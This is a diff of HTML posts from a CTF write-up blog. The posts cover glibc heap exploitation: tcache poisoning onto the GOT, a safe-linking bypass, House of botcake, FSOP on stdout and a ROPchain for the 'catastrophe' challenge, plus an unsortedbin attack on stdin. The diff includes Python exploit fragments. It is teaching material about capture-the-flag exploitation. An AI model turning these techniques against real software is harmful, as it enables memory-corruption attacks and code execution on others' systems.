 <p>The plan is to:</p>
 <ul>
 <li>Allocate two <code>0x408</code>-sized chunks : pivot and victim, in order to easily get later libc leak.</li>
 <li>Allocate 9 more chunks and then fill the <code>0x410</code> tcachebin with them (with only 7 of them).</li>
 <li>Delete <code>victim</code> and overflow pivot up to the next free pointer of <code>victim</code> to get a libc leak.</li>
 <li>Allocate a <code>0x408</code>-sized chunk to get the <code>8</code>-th chunk (within <code>chunk_array</code>) which is on the top of the bin.</li>
-<li>Leak the heap same way than for libc, but we have to defeat safe-linking.</li>
+<li>Leak the heap same way as for libc, but we have to defeat safe-linking.</li>
 <li>Delete the <code>9</code>-th chunk to put it in the tcachebin at the first position.</li>
 <li>Then we can simply <code>edit</code> chunk <code>8</code> and overflow over chunk <code>9</code> to poison its next <code>fp</code> to hiijack it toward the GOT entry of <code>free</code>.</li>
 <li>Pop chunk <code>9</code> from the freelist and then request another the target memory area : the GOT entry of <code>free</code>.</li>
@@ -1678,7 +2119,7 @@ The vulnerability lies into the <code>edit</code> function:</p>
 </div>
 <p>We overflow the <code>8</code>-th chunk to overwrite the next freepointer of <code>chunk9</code> that is stored at the HEAD of the <code>0x410</code> tcachebin. Then we got an arbitrary write.
 We craft a nice header to be able to request it back from the tcache, and we encrypt the <code>next</code> with the location of the <code>chunk9</code> to pass safe-linking checks.</p>
-<p>Given we hiijack GOT we initialized properly some pointers around to avoid segfaults. We do not get a write into the GOT entry of <code>free</code> cause it is misaligned and <code>malloc</code> needs <code>16</code> bytes aligned pointers.</p>
+<p>Given we hiijack GOT we initialized properly some pointers around to avoid segfaults. We do not get a write into the GOT entry of <code>free</code> cause it is unaliagned and <code>malloc</code> needs <code>16</code> bytes aligned next free pointer.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x411</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x2730</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">free</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)))</span>
 
 <span class="c1"># dumb</span>
@@ -1935,12 +2376,12 @@ $
             
             
             <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
-    <h2 id="introduction">
+    <h1 id="introduction">
         Introduction
         <a data-clipboard-text="https://nasm.re/posts/catastrophe/#introduction" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Introduction" href="#introduction">
             <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
         </a>
-    </h2>
+    </h1>
 </div>
 <blockquote>
 <p>I just learned how to use malloc and free&hellip; am I doing this right?</p>
@@ -1956,13 +2397,35 @@ $
   
   >right here</a
 >.</p>
+
+
+
+  <div class="gblog-toc gblog-toc__level--5">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#tl-dr">TL; DR</a></li>
+    <li><a href="#what-we-have">What we have</a></li>
+    <li><a href="#defeat-safe-linking">Defeat safe-linking</a></li>
+    <li><a href="#house-of-botcake">House of botcake</a></li>
+    <li><a href="#getting-arbitrary-write">Getting arbitrary write</a></li>
+    <li><a href="#fsop-on-stdout-to-leak-environ">FSOP on stdout to leak environ</a></li>
+    <li><a href="#ropchain">ROPchain</a></li>
+    <li><a href="#resources">Resources</a></li>
+    <li><a href="#appendices">Appendices</a></li>
+  </ul>
+</nav>
+    <hr />
+  </div>
+
+
 <div class="gblog-post__anchorwrap">
-    <h2 id="tl-dr">
+    <h1 id="tl-dr">
         TL; DR
         <a data-clipboard-text="https://nasm.re/posts/catastrophe/#tl-dr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor TL; DR" href="#tl-dr">
             <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
         </a>
-    </h2>
+    </h1>
 </div>
 <ul>
 <li>Leak heap address + defeating safe linking by printing the first free&rsquo;d chunk in the tcache.</li>
@@ -1975,12 +2438,12 @@ $
 <li>FSOP on stdout to leak <code>environ</code> and then ROP over the stack.</li>
 </ul>
 <div class="gblog-post__anchorwrap">
-    <h2 id="what-we-have">
+    <h1 id="what-we-have">
         What we have
         <a data-clipboard-text="https://nasm.re/posts/catastrophe/#what-we-have" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What we have" href="#what-we-have">
             <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
         </a>
-    </h2>
+    </h1>
 </div>
 <p>catastrophe is a classic heap challenge here are the classic informations about it:</p>
 <pre tabindex="0"><code>$ ./libc.so.6 
@@ -2020,12 +2483,12 @@ $ checksec --file catastrophe
   >House of botcake</a
 > but first of all we have to defeat the safe linking to properly getting an arbitrary write.</p>
 <div class="gblog-post__anchorwrap">
-    <h2 id="defeat-safe-linking">
+    <h1 id="defeat-safe-linking">
         Defeat safe-linking
         <a data-clipboard-text="https://nasm.re/posts/catastrophe/#defeat-safe-linking" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Defeat safe-linking" href="#defeat-safe-linking">
             <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
         </a>
-    </h2>
+    </h1>
 </div>
 <p>Since <code>2.32</code> is introduced in the libc the safe-linking mechanism that does some xor encyptions on <code>tcache</code>, <code>fastbin</code> next fp to prevent pointer hiijacking. Here is the core of the mechanism:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L340
@@ -2060,52 +2523,13 @@ $ checksec --file catastrophe
 <span class="p">}</span>
 </code></pre></div><p>Thus, the first time a chunk is inserted into a tcache list, <code>e-&gt;next</code> is initialized to <code>&amp;e-&gt;next &gt;&gt; 12</code> (heap base address) xor <code>tcache-&gt;entries[tc_idx]</code> which is equal to zero when the list for a given size is empty.</p>
 <p>Which means to leak the heap address we simply have to print a free&rsquo;d chunk once it has been inserted in the tcache.</p>
-<p>BUT if we&rsquo;re not able to leak the next fp of a the first chunk linked into a tcachebin that&rsquo;s not major, let&rsquo;s see how we could do differently, here is a chunk linked into the tcache:</p>
-<pre tabindex="0"><code>0x5621147a06d0:	0x0000000000000000	0x0000000000000111
-0x5621147a06e0:	0x00005624766b4270	0x0d01c2bce1459652
-0x5621147a06f0:	0x0000000000000000	0x0000000000000000
-0x5621147a0700:	0x0000000000000000	0x0000000000000000
-0x5621147a0710:	0x0000000000000000	0x0000000000000000
-0x5621147a0720:	0x0000000000000000	0x0000000000000000
-0x5621147a0730:	0x0000000000000000	0x0000000000000000
-0x5621147a0740:	0x0000000000000000	0x0000000000000000
-0x5621147a0750:	0x0000000000000000	0x0000000000000000
-0x5621147a0760:	0x0000000000000000	0x0000000000000000
-0x5621147a0770:	0x0000000000000000	0x0000000000000000
-0x5621147a0780:	0x0000000000000000	0x0000000000000000
-0x5621147a0790:	0x0000000000000000	0x0000000000000000
-0x5621147a07a0:	0x0000000000000000	0x0000000000000000
-0x5621147a07b0:	0x0000000000000000	0x0000000000000000
-0x5621147a07c0:	0x0000000000000000	0x0000000000000000
-0x5621147a07d0:	0x0000000000000000	0x0000000000000000
-0x5621147a07e0:	0x0000000000000000	0x0000000000000111
-</code></pre><p>We clearly see the <code>chunk-&gt;next</code> pointer and right after the <code>chunk-&gt;key</code> field. If we decrypt the pointer, it gives: <code>(HeapPos &gt;&gt; 12) ^ encryptedPtr</code>, in our case =&gt; <code>(0x5621147a06e0 &gt;&gt; 12) ^ 0x00005624766b4270</code> = <code>0x5621147a05d0</code>. You should note that between the chunk&rsquo;s location and the the encrypted, the most significant byte plus the nibble right after are the same, here is the reason: when a pointer is encrypted, given the chunk&rsquo;s location is shifted of 12 bits the 12 most significant bits of the pointer are not encrypted at all, which allows us to recover the most significant part of the pointer.</p>
-<p>But what can we do with only the 12 most significant bits ? We can recover the whole original pointer. Given we know this part of the pointer, it gives a part of the chunk&rsquo;s location, whith this part we can recover the 12 bits encrypted right after the leaked part, and then we can do it again for the whole pointer.</p>
-<p>That is done thanks to the properties of the xor operation, even if the length of the heap addresses grow up the weakness stays the same: by using the base address of the heap and by xor-ing it to another heap address you leave it to being exposed to such attacks and weaknesses.</p>
-<p>It ends up to this function (code does not come from me but from <a
-  class="gblog-markdown__link"
-  href="https://github.com/AeroCTF/aero-ctf-2022/blob/main/tasks/pwn/heap-2022/solution/sploit.py"
-  
-  >this writeup about a heap challenge from the aeroCTF</a
->):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">decrypt_pointer</span><span class="p">(</span><span class="n">leak</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
-    <span class="n">parts</span> <span class="o">=</span> <span class="p">[]</span>
-
-    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">36</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">36</span><span class="p">)</span>
-    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">36</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span>
-    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span>
-
-    <span class="k">return</span> <span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">|</span> <span class="n">parts</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">decrypt_pointer</span><span class="p">(</span><span class="mh">0x00005624766b4270</span><span class="p">)))</span>
-<span class="c1"># =&gt; 0x5621147a0000</span>
-</code></pre></div><div class="gblog-post__anchorwrap">
-    <h2 id="house-of-botcake">
+<div class="gblog-post__anchorwrap">
+    <h1 id="house-of-botcake">
         House of botcake
         <a data-clipboard-text="https://nasm.re/posts/catastrophe/#house-of-botcake" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor House of botcake" href="#house-of-botcake">
             <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
         </a>
-    </h2>
+    </h1>
 </div>
 <p>The <a
   class="gblog-markdown__link"
@@ -2125,20 +2549,20 @@ $ checksec --file catastrophe
 <li>That&rsquo;s finished, to get a write what where we just need to request a <code>0x130</code> sized chunk. Thus we can hiijack the next fp of <code>a</code> that is currently referenced by the tcache by the location we wanna write to. And next time two <code>0x100</code> sized chunks are requested, the second one will be the target location.</li>
 </ul>
 <div class="gblog-post__anchorwrap">
-    <h2 id="getting-arbitrary-write">
+    <h1 id="getting-arbitrary-write">
         Getting arbitrary write
         <a data-clipboard-text="https://nasm.re/posts/catastrophe/#getting-arbitrary-write" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Getting arbitrary write" href="#getting-arbitrary-write">
             <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
         </a>
-    </h2>
+    </h1>
 </div>
 <p>To make use of the write what were we got thanks to the <a
   class="gblog-markdown__link"
   href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
   
   >House of botcake</a
->, we need to get both heap and libc leak. To leak libc that&rsquo;s pretty easy, we just need to print out a free&rsquo;d chunk stored into the unsortedbin, its forward pointer is not encrypted with safe-linking.</p>
-<p>As seen previously, to bypass safe-linking we have to print a free&rsquo;d chunk once it has been inserted into the tcache. It should give us the base address of the heap. When we got it, we just have to initialize the location we wanna write to <code>location ^ ((heap_base + chunk_offset) &gt;&gt; 12)</code> to encrypt properly the pointer, this way the primitive is efficient.</p>
+>, we need to get both heap and libc leak. To leak libc that&rsquo;s pretty easily we just need to print out a free&rsquo;d chunk stored into the unsortedbin, it&rsquo;s forward pointer is not encrypted with safe-linking.</p>
+<p>As seen previously, to bypass safe-linking we have to print a free&rsquo;d chunk once it has been inserted in the tcache. It would give us the base address of the heap. When we got it, we just have to initialize the location we wanna write to <code>location ^ ((heap_base + chunk_offset) &gt;&gt; 12)</code> to encrypt properly the pointer, this way the primitive is efficient.</p>
 <p>Implmentation of the <a
   class="gblog-markdown__link"
   href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
@@ -2254,20 +2678,20 @@ $ checksec --file catastrophe
 </span><span class="s2">0x55c4fbcd7c40:	0x0000000000000000	0x00000000000203c1 [top chunk]
 </span><span class="s2">&#34;&#34;&#34;</span>
 </code></pre></div><div class="gblog-post__anchorwrap">
-    <h2 id="fsop-on-stdout-to-leak-environ">
+    <h1 id="fsop-on-stdout-to-leak-environ">
         FSOP on stdout to leak environ
         <a data-clipboard-text="https://nasm.re/posts/catastrophe/#fsop-on-stdout-to-leak-environ" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor FSOP on stdout to leak environ" href="#fsop-on-stdout-to-leak-environ">
             <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
         </a>
-    </h2>
+    </h1>
 </div>
-<p>I didn&rsquo;t see first that only <code>PARTIAL RELRO</code> was enabled on the libc, so the technique I show you here was thought to face a <code>2.35</code> libc with <code>FULL RELRO</code> enabled that the reason why I didn&rsquo;t just hiijack some GOT pointers within the libc (like <code>strlen</code> for example).</p>
+<p>I didn&rsquo;t see first that only <code>PARTIAL RELRO</code> was enabled on the libc, so the technique I show you here was thought to face a <code>2.35</code> libc with <code>FULL RELRO</code> enabled that the reason why I didn&rsquo;t just hiijack some GOT pointers within the libc.</p>
 <p>A pretty convenient way to gain code execution when the hooks (<code>__malloc_hook</code>, <code>__free_hook</code>) are not present (since <code>2.32</code> cf <a
   class="gblog-markdown__link"
   href="https://sourceware.org/pipermail/libc-alpha/2021-August/129718.html"
   
   >this for 2.34</a
->) is to leak the address of the stack to then write a ROPchain on it. To leak a stack address we can make use of the <code>environ</code> symbol stored in the dynamic linker, it contains a pointer toward <code>envp</code>.</p>
+>) is to leak the address of the stack to then write a ROPchain on it. To leak a stack address we can make use of the <code>environ</code> symbol stored in the dynamic linker, it contains a pointer toward <code>**envp</code>.</p>
 <p>To read this pointer we need a read what where primitive! Which can be achieved through a file stream oriented programming (FSOP) attack on <code>stdout</code> for example. To dig more FSOP I advise you to read <a
   class="gblog-markdown__link"
   href="https://nasm.re/posts/onceforall/"
@@ -2279,7 +2703,7 @@ $ checksec --file catastrophe
   
   >this one</a
 >.</p>
-<p>To understand the whole process I&rsquo;ll try to introduce you to FSOP. First of all the target structure is stdout, we wanna corrupt stdout because it&rsquo;s used right after the <code>fgets</code> that reads the input from the user by using the <code>putchar</code> function. Basically on linux &ldquo;everything is a file&rdquo; from the character device the any stream (error, input, output, opened file) we can interact with a resource by just by opening it and getting a file descriptor on it, right ? This way each file descripor has an associated structure called <code>FILE</code> you may have used if you have already done some stuff with files on linux. Here is its definition:</p>
+<p>To understand the whole process I&rsquo;ll try to introduce you to FSOP. First of all the target structure is stdout, we wanna corrupt stdout because it&rsquo;s used ritght after the <code>fgets</code> that reads the input from the user by the <code>putchar</code> function. Basically on linux &ldquo;everything is a file&rdquo; from the character device the any stream (error, input, output, opened file) we can interact with  a resource just by opening it and by getting a file descriptor on it, right ? This way each file descripor has an associated structure called <code>FILE</code> you may have used if you have already done some stuff with files on linux. Here is its definition:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L49
 </span><span class="c1"></span><span class="cm">/* The tag name of this struct is _IO_FILE to preserve historic
 </span><span class="cm">   C++ mangled names for functions taking FILE* arguments.
@@ -2536,14 +2960,14 @@ So first condition:</p>
 <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
 
 </code></pre></div><div class="gblog-post__anchorwrap">
-    <h2 id="ropchain">
+    <h1 id="ropchain">
         ROPchain
         <a data-clipboard-text="https://nasm.re/posts/catastrophe/#ropchain" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain">
             <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
         </a>
-    </h2>
+    </h1>
 </div>
-<p>Now we leaked the stack address we finally just need to achieve another arbitrary write to craft the ROPchain onto the <code>op_malloc</code> function&rsquo;s stackframe that writes the user input into the requested chunk.</p>
+<p>Now we leaked the stack address we finally just need to achieve another arbitrary write to craft the ROPchain onto the <code>op_malloc</code> function that writes the user input into the requested chunk.</p>
 <p>To get the arbitrary write we just have to use the same overlapping chunks technique than last time, let&rsquo;s say we wanna write to <code>target</code> and we have <code>prev</code> that overlaps <code>victim</code>:</p>
 <ul>
 <li><code>free(prev)</code> ends up in the tcachebin (0x140), it has already been consolidated, it <em>already</em> overlaps <code>victim</code>.</li>
@@ -2588,12 +3012,12 @@ run
 $ cat flag.txt
 hope<span class="o">{</span>apparently_not_good_enough_33981d897c3b0f696e32d3c67ad4ed1e<span class="o">}</span>
 </code></pre></div><div class="gblog-post__anchorwrap">
-    <h2 id="resources">
+    <h1 id="resources">
         Resources
         <a data-clipboard-text="https://nasm.re/posts/catastrophe/#resources" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Resources" href="#resources">
             <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
         </a>
-    </h2>
+    </h1>
 </div>
 <ul>
 <li><a
@@ -2616,12 +3040,12 @@ hope<span class="o">{</span>apparently_not_good_enough_33981d897c3b0f696e32d3c67
 ></li>
 </ul>
 <div class="gblog-post__anchorwrap">
-    <h2 id="appendices">
+    <h1 id="appendices">
         Appendices
         <a data-clipboard-text="https://nasm.re/posts/catastrophe/#appendices" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Appendices" href="#appendices">
             <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
         </a>
-    </h2>
+    </h1>
 </div>
 <p>Final exploit:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
@@ -4092,7 +4516,7 @@ Find the tasks and the final exploit <a
 </span><span class="s2">0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
 </span><span class="s2">&#34;&#34;&#34;</span>
 
-</code></pre></div><p>We allocate 6 chunks, we do need of 6 chunks because of the fake size we write on <code>chunk_2</code> (<code>&amp;chunk_2</code> + <code>0xb0</code> = <code>0x555555608690</code>, in the last chunk near to the top chunk). In the same way we craft a fake header in the body of the last chunk to avoid issues during the release of <code>chunk_2</code>. If you&rsquo;re not familiar with the security checks done by <code>malloc</code> and <code>free</code>, I would advise you to take a look at <a
+</code></pre></div><p>We allocate 6 chunks, we do need of 6 chunks because of the fake size we write on <code>chunk_2</code> (<code>&amp;chunk_2</code> + <code>0xb0</code> = <code>0x555555608690</code>, in the last chunk near the top chunk). In the same way we craft a fake header in the body of the last chunk to avoid issues during the release of <code>chunk_2</code>. If you&rsquo;re not familiar with the security checks done by <code>malloc</code> and <code>free</code>, I would advise you to take a look at <a
   class="gblog-markdown__link"
   href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks"
   
@@ -4363,7 +4787,7 @@ $1 = {
 <li>request the <strong>exact</strong> size of the last chunk in the unsorted bin</li>
 <li>It should write at <code>&amp;target</code> the address of the unsorted bin</li>
 </ul>
-<p>An essential thing to note is that if there is no chunks in your fastbin / smallbin and that you&rsquo;re requesting a fastbin/smallbin-sized chunk, the unsorted bin will be inspected and if the last chunk doesn&rsquo;t fit the request and that your unsortedbin is corrputed cause you ran an unsortedbin attack before, the program will most of the time issues a <code>malloc(): memory corruption</code>. Anyway the best thing to do is to take a look at the <a
+<p>An essential thing to note is that if there is no chunks in your fastbin / smallbin and that you&rsquo;re requesting a fastbin/smallbin-sized chunk, the unsorted bin will be inspected and if the last chunk doesn&rsquo;t fit the request, the program will most of the time issues a <code>malloc(): memory corruption</code>. Anyway the best thing to do is to take a look at the <a
   class="gblog-markdown__link"
   href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3519"
   
@@ -4458,7 +4882,7 @@ $1 = {
 
 	<span class="p">[...]</span>
 <span class="p">}</span>
-</code></pre></div><p>According to what I said earlier, the goal is to replace <code>stdin-&gt;_IO_buf_end</code> with <code>&amp;unsortedbin</code> which means we have to write to the backward pointer of the last chunk in the unsorted bin (chunk_2) <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To do so we can trigger a write after free primitive by taking back <code>chunk_2</code> from the unsorted bin from the fastbin:</p>
+</code></pre></div><p>According to what I said earlier, the goal is to replace <code>stdin-&gt;_IO_buf_end</code> with <code>&amp;unsortedbin</code> which means we have to write to the backward pointer of the last chunk in the unsorted bin (chunk_2) <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To do so we can trigger a write after free primitive by taking back <code>chunk_2</code> from the unsorted bin to the fastbin:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="s2">&#34;&#34;&#34;
 </span><span class="s2">Before:
 </span><span class="s2">0x30: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
@@ -4483,7 +4907,7 @@ $1 = {
 </span><span class="s2">FD: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
 </span><span class="s2">BK: 0x5555556085e0 —▸ 0x7ffff7dcfa30 (_IO_2_1_stdin_+48) ◂— 0x0
 </span><span class="s2">&#34;&#34;&#34;</span>
-</code></pre></div><p>As you can read right above, the <code>chunk_2</code> has its backward pointer set to <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To achieve the partial unlink we just have to request a <code>0x30</code> sized chunk with nothing in the fastbin freelist. That&rsquo;s the last step of the unsortedbin attack, clean out the fastbin:</p>
+</code></pre></div><p>As you can read right above, the <code>chunk_2</code> has its backward pointer set to <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To achieve the partial unlink we just have to request a <code>0x30</code> sized chunk with nothing in the fastbin freelists. That&rsquo;s the last step of the unsortedbin attack, clean out the fastbin:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="s2">&#34;&#34;&#34;
 </span><span class="s2">Before: same as above
 </span><span class="s2">&#34;&#34;&#34;</span>
